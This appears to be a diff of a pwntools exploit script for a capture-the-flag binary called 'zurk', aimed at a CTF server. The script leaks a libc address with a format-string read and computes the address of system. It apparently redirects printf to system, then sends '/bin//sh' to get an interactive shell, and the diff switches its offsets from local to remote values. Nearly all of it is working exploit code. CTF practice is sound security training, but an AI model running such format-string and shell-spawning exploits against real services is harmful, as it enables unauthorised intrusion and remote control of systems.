@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 from pwn import *
+import os
 
 #proc = process('./zurk')
 proc = remote("binary.utctf.live", 9003)
@@ -13,11 +14,12 @@ for _ in range(4):
 #leak libc and get system address
 proc.sendline('%17$p')
 libc_start_main = proc.recvline().decode().split(' ')[0]
-libc_start_main = int(libc_start_main, 16) - 231
+#libc_start_main = int(libc_start_main, 16) - 231 #local
+libc_start_main = int(libc_start_main, 16) - 240 #remote
 libc_base = libc_start_main - 0x20740 #remote
 #libc_base = libc_start_main - 0x21ab0 #local
-#system = libc_base + 0x45390 #remote
-system = libc_base + 0x4f440 #local
+system = libc_base + 0x45390 #remote
+#system = libc_base + 0x4f440 #local
 str_system = str(hex(system))[2:]
 print(str_system)
 
@@ -44,7 +46,7 @@ proc.sendline(p)
 print("payload")
 
 #pass /bin/sh to printf (now system)
-print(proc.recvline())
-print(proc.recvline())
+#print(proc.recvline())
+#print(proc.recvline())
 proc.sendline('/bin//sh')
 proc.interactive()
